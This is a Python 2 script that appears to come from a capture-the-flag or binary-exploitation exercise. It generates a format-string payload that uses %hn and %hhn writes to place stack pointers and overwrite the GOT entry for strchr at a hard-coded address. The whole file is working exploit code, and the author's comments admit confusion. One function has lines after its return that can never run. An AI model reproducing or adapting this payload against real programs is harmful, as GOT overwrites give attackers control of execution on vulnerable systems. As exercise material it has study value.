import sys
import struct

OFFSET = 0x81
STRCHR_GOT = 0x8049980

def calc_write_str_2_bytes(value, sp, length):
    add = 0x0
    # get byte from system addr
    byte = value % 65536
    # calc num chars to add to str
    add = byte - length % 65536
    if add <= 0:
        add += 65536
        length += add
    return "%"+str(add)+"x%"+str(sp)+"$hn\n"
    # wtf this makes no sense (related to flag spacing?)
    if add <= 8:
        return 'a'*add+"%" + str(sp) + "$hn\n"
    else:
        return "%"+str(add)+"x%"+str(sp)+"$hn\n"


def calc_write_str_bytes(value, sp, length):
    add = 0x0
    # get byte from system addr
    byte = value % 256
    # calc num chars to add to str
    add = byte - length % 256
    if add <= 0:
        add += 256
        length += add
    # wtf this makes no sense (related to flag spacing?)
    if add <= 8:
        return 'a'*add+"%" + str(sp) + "$hhn\n"
    else:
        return "%"+str(add)+"x%"+str(sp)+"$hhn\n"


# get sp 17 as sys.argv[1] and calc 2 bytes to write to sp 53
# the - 0x24 means that the pointer will refer to sp 44
bytes_2 = int(sys.argv[1], 16) - 0x24
byte = bytes_2 % 256


out = ""
# writes pointer to sp 44 to addr sp 53
out += calc_write_str_2_bytes(bytes_2, 17, OFFSET)

# write got pointer to sp 44
for i in range(0, 4):
    out += calc_write_str_bytes(byte + 4*i, 17, OFFSET)
    out += calc_write_str_bytes(STRCHR_GOT % 256 + i, 53, OFFSET)
    for j in range(1, 4):
        got_byte = (STRCHR_GOT >> (8 * j)) % 256
        out += calc_write_str_bytes(byte + j + 4*i, 17, OFFSET)
        out += calc_write_str_bytes(got_byte, 53, OFFSET)
        
print out


